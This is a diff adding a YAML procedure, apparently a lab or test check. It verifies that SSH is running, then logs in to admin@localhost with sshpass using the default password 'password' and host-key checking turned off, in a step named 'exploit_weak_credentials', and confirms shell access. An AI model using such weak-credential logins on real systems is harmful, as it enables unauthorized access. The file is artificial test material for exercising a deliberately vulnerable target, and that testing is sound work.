@@ -1,0 +1,31 @@
+procedure:
+- action:
+    command: service ssh status 2>/dev/null || ps aux | grep sshd | grep -v grep
+    type: exec_target
+  expect:
+    exit_code: 0
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: sshpass -p 'password' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      admin@localhost 'id'
+    type: exec_target
+  expect:
+    stdout_contains: uid=1001(admin)
+  outputs: {}
+  session: null
+  step_id: exploit_weak_credentials
+  timeout: 15
+- action:
+    command: sshpass -p 'password' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      admin@localhost 'id && whoami && echo LOGIN_SUCCESS'
+    type: exec_target
+  expect:
+    stdout_contains: uid=1001(admin) gid=1001(admin) groups=1001(admin)
+  outputs: {}
+  session: null
+  step_id: verify_shell_access
+  timeout: 15
+sessions: []
